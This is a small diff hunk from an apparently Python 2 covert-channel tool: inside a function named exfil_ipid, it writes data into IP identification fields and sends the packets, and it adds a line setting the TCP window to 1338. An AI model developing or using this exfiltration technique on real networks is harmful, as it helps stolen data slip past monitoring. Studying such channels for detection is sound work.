@@ -283,6 +283,7 @@ def exfil_ipid():
             print '[*] EOM'
         add_n0ise_ipid(i)
         pkt.id = exfilArray[i]
+        pkt.window = 1338
         time.sleep(0.4)
         try:
             send(pkt)
